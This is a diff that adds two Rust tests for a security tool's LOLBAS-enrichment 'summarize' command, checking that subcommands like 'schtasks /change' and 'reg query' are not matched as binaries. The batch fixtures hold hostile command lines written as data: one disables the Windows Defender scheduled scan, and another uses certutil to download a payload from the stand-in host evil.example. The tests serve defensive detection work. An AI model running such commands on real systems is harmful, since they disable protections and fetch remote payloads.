@@ -3402,6 +3402,68 @@ fn summarize_lolbas_enrichment_ignores_schtasks_sc_schedule_option_as_sc_binary(
 }
 
 #[test]
+fn summarize_lolbas_enrichment_ignores_schtasks_change_subcommand_as_change_binary() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        "schtasks /change /tn \"microsoft\\windows\\windows defender\\windows defender scheduled scan\" /disable\r\n\
+         schtasks /create /tn Job /sc once /tr \"change.exe port /query\"\r\n",
+    )
+    .expect("write input");
+    let lolbas = dir.path().join("lolbas.json");
+    fs::write(
+        &lolbas,
+        r#"[
+          {
+            "Name": "Change.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/Change/",
+            "Commands": [
+              {
+                "Category": "Execute",
+                "MitreID": "T1218"
+              }
+            ]
+          }
+        ]"#,
+    )
+    .expect("write lolbas");
+
+    let out = Command::cargo_bin("harrington")
+        .expect("bin")
+        .args([
+            "summarize",
+            input.to_str().expect("input path"),
+            "--lolbas-json",
+            lolbas.to_str().expect("lolbas path"),
+        ])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
+    let matches = v
+        .get("lolbas_matches")
+        .and_then(|v| v.as_array())
+        .expect("lolbas_matches array");
+    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
+    assert!(
+        !matches.iter().any(|item| {
+            item.get("command").and_then(|v| v.as_str())
+                == Some(
+                    "schtasks /change /tn \"microsoft\\windows\\windows defender\\windows defender scheduled scan\" /disable",
+                )
+        }),
+        "unexpected /change subcommand match: {matches:?}"
+    );
+    assert_eq!(
+        matches[0].get("command").and_then(|v| v.as_str()),
+        Some("change.exe port /query")
+    );
+}
+
+#[test]
 fn summarize_lolbas_enrichment_ignores_program_names_in_schtasks_remote_auth_fields() {
     let dir = TempDir::new().expect("tmp");
     let input = dir.path().join("in.bat");
@@ -3672,6 +3734,66 @@ fn summarize_lolbas_enrichment_ignores_program_names_in_reg_key_paths() {
         .and_then(|v| v.as_array())
         .expect("lolbas_matches array");
     assert_eq!(matches.len(), 0, "unexpected matches: {matches:?}");
+}
+
+#[test]
+fn summarize_lolbas_enrichment_ignores_reg_query_subcommand_as_query_binary() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        "reg query \"HKU\\S-1-5-19\\Environment\" >nul 2>&1\r\n\
+         certutil -urlcache -split -f http://evil.example/payload.bin C:\\Users\\Public\\payload.bin & C:\\Temp\\query.exe http://evil.example/\r\n",
+    )
+    .expect("write input");
+    let lolbas = dir.path().join("lolbas.json");
+    fs::write(
+        &lolbas,
+        r#"[
+          {
+            "Name": "Query.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/Query/",
+            "Commands": [
+              {
+                "Category": "Execute",
+                "MitreID": "T1218"
+              }
+            ]
+          }
+        ]"#,
+    )
+    .expect("write lolbas");
+
+    let out = Command::cargo_bin("harrington")
+        .expect("bin")
+        .args([
+            "summarize",
+            input.to_str().expect("input path"),
+            "--lolbas-json",
+            lolbas.to_str().expect("lolbas path"),
+        ])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
+    let matches = v
+        .get("lolbas_matches")
+        .and_then(|v| v.as_array())
+        .expect("lolbas_matches array");
+    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
+    assert!(
+        !matches.iter().any(|item| {
+            item.get("command").and_then(|v| v.as_str())
+                == Some("reg query \"HKU\\S-1-5-19\\Environment\" >nul 2>&1")
+        }),
+        "unexpected query subcommand match: {matches:?}"
+    );
+    assert_eq!(
+        matches[0].get("command").and_then(|v| v.as_str()),
+        Some("C:\\Temp\\query.exe http://evil.example/")
+    );
 }
 
 #[test]
